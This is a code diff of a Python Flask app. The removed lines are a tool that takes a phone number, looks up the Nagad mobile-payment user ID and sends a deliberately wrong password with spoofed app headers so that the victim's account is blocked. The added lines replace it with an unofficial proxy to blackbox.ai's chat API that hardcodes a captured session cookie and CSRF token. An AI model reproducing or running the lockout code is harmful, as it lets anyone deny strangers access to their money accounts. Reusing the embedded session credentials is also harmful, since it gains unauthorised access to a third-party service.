@@ -3,66 +3,63 @@ import requests
 
 app = Flask(__name__)
 
-@app.route('/check_user', methods=['GET'])
-def check_user():
-    # Get the 'number' parameter from the query string
-    number = request.args.get('number')
-    
-    if not number:
-        return jsonify({'error': 'Number parameter is required'}), 400
-
-    pin = '6C237681E70921603A306BE9A1A5D9833FCE5C1E268F52B1650970EAAD0DCE21'
-    mang = pin * 10
-
-    # First API endpoint
-    api_url = f"https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in?msisdn={number}"
+@app.route('/api/chat', methods=['GET'])
+def chat():
+    # Set up the request URL and headers
+    url = 'https://www.blackbox.ai/api/chat'
     headers = {
-        "X-KM-User-AspId": "100012345612345",
-        "X-KM-User-Agent": "ANDROID/1164",
-        "X-KM-DEVICE-FGP": "4B3CBA66592A037F7B7E60F515B6212368476339DC7F019E31D99D293250B23C",
-        "X-KM-Accept-language": "bn",
-        "X-KM-AppCode": "01"
+        'authority': 'www.blackbox.ai',
+        'accept': '*/*',
+        'accept-language': 'en-SG,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'cookie': 'sessionId=21b9cdf9-df30-486f-b114-0d34c05b5c42; __Host-authjs.csrf-token=4ad540eaacdf8603762296d14b2ce880a5af772d821dfe7fec6f814999bb8e4d%7C8ee5274a727bc70dc30214a7a2d8bb05ea4cfb2f00dda5f2451566ee38751058; __Secure-authjs.callback-url=https%3A%2F%2Fwww.blackbox.ai; intercom-id-jlmqxicb=fce17476-95ad-423f-8ba5-6ad568a0cc33; intercom-session-jlmqxicb=; intercom-device-id-jlmqxicb=10662a8f-63f9-4918-8356-45a78bbbecff',
+        'origin': 'https://www.blackbox.ai',
+        'referer': 'https://www.blackbox.ai/agent/ImageGenerationLV45LJp',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
     }
 
-    # Send the first request to check user status
-    response = requests.get(api_url, headers=headers)
-    response_data = response.json()
+    # Collect user input for the message content from query parameters
+    user_content = request.args.get("user_content")
 
-    # Check if 'userId' exists in the response
-    user_id = response_data.get('userId')
-    if not user_id:
-        return jsonify({'error': 'userId not found in the response'}), 400
+    if not user_content:
+        return jsonify({"error": "No user content provided"}), 400
 
-    # Second API endpoint to block account
-    login_url = 'https://app2.mynagad.com:20002/api/login'
-    login_headers = {
-        'User-Agent': 'okhttp/3.14.9',
-        'Connection': 'Keep-Alive',
-        'Accept-Encoding': 'gzip',
-        'X-KM-UserId': user_id,
-        'X-KM-User-AspId': '100012345612345',
-        'X-KM-User-Agent': 'ANDROID/1164',
-        'X-KM-Accept-language': 'bn',
-        'X-KM-AppCode': '01',
-        'Content-Type': 'application/json; charset=UTF-8'
+    # Set up the data payload with dynamic content input
+    data = {
+        "messages": [
+            {"id": "user-message", "content": user_content, "role": "user"}
+        ],
+        "id": "unique-id",
+        "previewToken": None,
+        "userId": None,
+        "codeModelMode": True,
+        "agentMode": {"mode": True, "id": "ImageGenerationLV45LJp", "name": "Image Generation"},
+        "trendingAgentMode": {},
+        "isMicMode": False,
+        "maxTokens": 1024,
+        "playgroundTopP": None,
+        "playgroundTemperature": None,
+        "isChromeExt": False,
+        "githubToken": None,
+        "clickedAnswer2": False,
+        "clickedAnswer3": False,
+        "clickedForceWebSearch": False,
+        "visitFromDelta": False,
+        "mobileClient": False,
+        "userSelectedModel": None
     }
-    
-    login_payload = {
-        'aspId': '100012345612345',
-        'password': mang,
-        'username': number
-    }
 
-    # Send the second request to block the account
-    login_response = requests.post(login_url, headers=login_headers, json=login_payload)
+    # Send the request to the external API
+    response = requests.post(url, headers=headers, json=data)
 
-    if login_response.status_code != 200:
-        return jsonify({'error': 'Failed to block the account'}), 500
-
-    return jsonify({
-        'developer': 'Mahmud Tech',
-        'message': 'Nagad account has been successfully blocked'
-    })
+    # Return the response back to the client
+    return jsonify(response.json()), response.status_code
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5001)
+    app.run(host='0.0.0.0', port=5000)
